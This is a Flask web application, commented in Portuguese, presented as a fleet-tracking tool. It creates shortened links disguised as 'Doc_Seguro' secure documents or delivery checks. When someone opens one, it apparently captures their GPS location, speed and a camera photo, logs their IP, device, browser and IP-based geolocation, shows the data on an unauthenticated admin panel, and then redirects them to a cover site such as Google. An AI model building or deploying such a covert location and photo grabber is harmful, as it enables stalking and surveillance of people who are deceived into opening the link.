from flask import Flask, render_template, request, jsonify, redirect, url_for
import uuid
from datetime import datetime
import os
import requests
import random

app = Flask(__name__)
FROTA = {}

# --- IDENTIFICAR BROWSER E DISPOSITIVO ---
def extrair_dados_tecnicos(ua_string):
    ua = ua_string.lower()
    # Identifica Dispositivo
    if "android" in ua: dispositivo = "📱 Android"
    elif "iphone" in ua or "ipad" in ua: dispositivo = "📱 iPhone/iOS"
    elif "windows" in ua: dispositivo = "💻 PC Windows"
    else: dispositivo = "❓ Desconhecido"
    
    # Identifica Browser
    if "chrome" in ua and "safari" in ua and "edg" not in ua: browser = "🌐 Chrome"
    elif "safari" in ua and "chrome" not in ua: browser = "🌐 Safari"
    elif "firefox" in ua: browser = "🌐 Firefox"
    elif "edg" in ua: browser = "🌐 Edge"
    elif "whatsapp" in ua: browser = "💬 WhatsApp Webview"
    else: browser = "🌐 Navegador"
    
    return dispositivo, browser

# --- CONSULTA GEOLOCALIZAÇÃO POR IP (ip-api.com) ---
def consultar_ip(ip):
    try:
        # A API gratuita não suporta HTTPS no plano free, usamos http
        res = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp", timeout=3).json()
        if res.get("status") == "success":
            local = f"{res.get('city')}, {res.get('regionName')} - {res.get('country')}"
            provedor = res.get("isp")
            return local, provedor
    except:
        pass
    return "Não identificado", "Não identificado"

# --- ENCURTADOR IS.GD ---
def encurtar_url(url_longa, alias=None):
    if "127.0.0.1" in url_longa or "localhost" in url_longa: return url_longa
    base_api = "https://is.gd/create.php?format=simple&url={}"
    if alias:
        try:
            alias_limpo = alias.replace(" ", "_").strip()
            url_p = f"{base_api.format(url_longa)}&shorturl={alias_limpo}"
            r = requests.get(url_p, timeout=5)
            if r.status_code == 200 and "Error" not in r.text: return r.text.strip()
        except: pass
    try:
        nome_auto = f"Doc_Seguro_{random.randint(10000, 99999)}"
        url_a = f"{base_api.format(url_longa)}&shorturl={nome_auto}"
        r = requests.get(url_a, timeout=5)
        if r.status_code == 200: return r.text.strip()
    except: pass
    return url_longa

# --- ROTAS ---
@app.route('/')
def index():
    return redirect(url_for('admin_panel'))

@app.route('/admin')
def admin_panel():
    return render_template("admin.html", frota=FROTA)

@app.route('/excluir/<id_ordem>', methods=['DELETE'])
def excluir_ordem(id_ordem):
    if id_ordem in FROTA:
        del FROTA[id_ordem]
        return jsonify({"ok": True})
    return jsonify({"ok": False}), 404

@app.route('/gerar_ordem', methods=['POST'])
def gerar_ordem():
    motorista = request.form.get("motorista")
    personalizacao = request.form.get("personalizacao")
    redirect_url = request.form.get("redirect") or "https://www.google.com"

    id_ordem = str(uuid.uuid4())[:8]
    link_longo = url_for('tela_motorista', id_ordem=id_ordem, _external=True)
    link_curto = encurtar_url(link_longo, alias=personalizacao)
    
    FROTA[id_ordem] = {
        "motorista": motorista,
        "lat": None, "lon": None,
        "foto": None, # <--- CAMPO PARA ARMAZENAR A FOTO
        "status": "Aguardando Conexão",
        "ultimo_visto": "-",
        "link": link_curto,
        "redirect": redirect_url,
        "ip": "-", "device": "-", "browser": "-", "local_ip": "-", "provedor": "-",
        "precisao": "-", "velocidade": 0
    }
    return redirect(url_for('admin_panel'))

@app.route('/api/frota')
def api_frota():
    return jsonify(FROTA)

@app.route('/verificar-entrega/<id_ordem>')
def tela_motorista(id_ordem):
    if id_ordem not in FROTA: return "Link expirado.", 404
    destino = FROTA[id_ordem].get("redirect", "https://www.google.com")
    return render_template("motorista.html", id=id_ordem, destino=destino)

@app.route('/api/sinal/<id_ordem>', methods=['POST'])
def receber_sinal(id_ordem):
    if id_ordem in FROTA:
        data = request.get_json()
        ua_string = request.headers.get('User-Agent')
        # Pega IP real (considerando proxy do Render/Ngrok)
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
        
        dispositivo, browser = extrair_dados_tecnicos(ua_string)
        localizacao_ip, provedor = consultar_ip(ip)
        
        FROTA[id_ordem].update({
            'lat': data.get('latitude'),
            'lon': data.get('longitude'),
            'foto': data.get('foto'), # <--- RECEBE A FOTO DO NAVEGADOR
            'status': "🟢 Online / Rastreando",
            'ultimo_visto': datetime.now().strftime("%d/%m %H:%M:%S"),
            'ip': ip,
            'device': dispositivo,
            'browser': browser,
            'local_ip': localizacao_ip,
            'provedor': provedor,
            'precisao': f"{data.get('accuracy', 0)}m",
            'velocidade': data.get('speed', 0)
        })
        return jsonify({"ok": True}), 200
    return jsonify({"ok": False}), 404

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
